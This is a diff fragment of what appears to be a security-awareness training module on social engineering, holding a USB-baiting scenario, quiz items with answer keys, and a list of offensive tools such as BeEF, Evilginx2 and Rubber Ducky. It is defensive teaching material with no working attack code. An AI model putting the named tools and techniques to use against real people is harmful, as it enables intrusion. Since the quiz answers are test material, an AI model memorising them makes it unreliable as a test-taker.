+                'Unexpected phone calls from "IT support" or "the help desk" requesting credentials or remote access',
+                'Employees receiving unsolicited offers for free security audits, software, or technical assistance'
+            ],
+            tools: ['SET (Social Engineering Toolkit)', 'Gophish (phishing simulation)', 'BeEF (Browser Exploitation Framework)', 'Evilginx2 (advanced phishing proxy)', 'Rubber Ducky (malicious USB)', 'WiFi Pineapple', 'Maltego (OSINT)', 'Vishing simulation platforms', 'Physical pen testing tools (lockpick sets, RFID cloners)', 'Deepfake detection tools (Microsoft Video Authenticator)']
+        },
+        interactive: {
+            scenario: 'Your organization\'s security team finds three USB drives scattered in the employee parking lot on Monday morning. The drives are labeled "Q4 Restructuring — Confidential" with your company\'s logo on a professional sticker. Your parking lot has no cameras. You know from threat intelligence that your industry sector has been targeted by APT groups recently. What do you do?',
+            options: [
+                'Plug one into an air-gapped analysis machine to see what is on it',
+                'Throw them away — someone probably dropped them accidentally',
+                'Treat this as a deliberate baiting attack: (1) DO NOT plug the drives into any system including air-gapped machines (BadUSB can attack at the hardware level), (2) send an immediate company-wide alert warning employees about the USB drops, (3) check with physical security for any other dropped devices, (4) send the drives to a forensics lab with proper hardware write-blockers and isolated analysis environments, (5) review endpoint logs for any USB insertions from similar device IDs this morning, (6) report to threat intelligence for attribution against known APT TTPs.',
+                'Collect them and give them to IT to scan with antivirus'
+            ],
+            correct: 2,
+            explanation: 'Professional labeling with your company logo means this is almost certainly a targeted baiting attack, not an accident. Key points: (1) Even air-gapped machines are not safe — BadUSB devices can reprogram USB controller firmware to act as keyboards and inject commands regardless of autorun settings. (2) The company-wide alert is critical because employees may have already found and used similar drives. (3) Endpoint logs can reveal if any drives from this batch were already plugged in. (4) Forensic analysis requires proper write-blockers and isolated environments — not just antivirus, which may not detect custom payloads. The APT threat intel context makes this especially urgent — this could be the initial access vector for a targeted campaign.'
+        },
+        quiz: [
+            { question: 'What distinguishes pretexting from basic phishing?', options: ['Pretexting only uses email', 'Pretexting involves building an elaborate, persistent false identity with supporting evidence, often over multiple interactions — while phishing is typically a single deceptive message', 'Pretexting is legal, phishing is not', 'Pretexting is automated, phishing is manual'], correct: 1, explanation: 'Pretexting is high-effort social engineering: the attacker creates a complete fake identity (business cards, LinkedIn profile, spoofed caller ID, rehearsed backstory) and builds trust over multiple interactions. Phishing is usually a single message sent at scale with minimal personalization.' },
+            { question: 'In the University of Illinois USB drop study, what percentage of dropped USB drives were plugged into computers?', options: ['5%', '20%', '48% — nearly half of all dropped drives were plugged in, with some opened within 6 minutes', '90%'], correct: 2, explanation: '48% of 297 dropped USB drives were connected to computers, proving that curiosity consistently defeats security training. Some users opened files within 6 minutes of finding the drive — faster than any security response could intervene.' },
+            { question: 'What is a watering hole attack?', options: ['Poisoning a company\'s water supply', 'Compromising a website frequently visited by the target group to deliver malware to visitors via drive-by exploits — named after predators who wait at watering holes', 'Flooding a server with traffic', 'Stealing water utility credentials'], correct: 1, explanation: 'Like a predator waiting at a watering hole, attackers compromise websites their targets regularly visit (industry forums, news sites, vendor portals). When employees visit the site, a drive-by exploit silently compromises their systems — bypassing email security entirely.' },
+            { question: 'Why are deepfake voice and video attacks particularly dangerous for social engineering?', options: ['They are cheaper than phishing', 'They defeat the primary defense against social engineering — voice and visual verification of identity. When you can\'t trust a phone call or video call to be real, callback verification becomes unreliable.', 'They are faster than email', 'They only affect large companies'], correct: 1, explanation: 'Traditional anti-social-engineering advice says "call back on a known number to verify." But deepfake technology can now replicate a person\'s voice and appearance convincingly enough to fool colleagues. The $25M Arup scam used a deepfake VIDEO CALL with multiple fake participants to authorize a wire transfer.' },
+            { question: 'What makes a quid pro quo attack effective?', options: ['It offers something the victim wants (tech support, a favor, a free service) in exchange for information or access — exploiting the reciprocity principle and the victim\'s desire to be helped', 'It uses brute force', 'It requires physical access', 'It only works against IT staff'], correct: 0, explanation: 'Quid pro quo exploits Cialdini\'s reciprocity principle: when someone offers help, people feel obligated to reciprocate. "I\'m from IT support, I can fix your slow computer if you give me your login credentials" is devastatingly effective because the victim genuinely wants the help being offered.' }
         ]
     }
 };
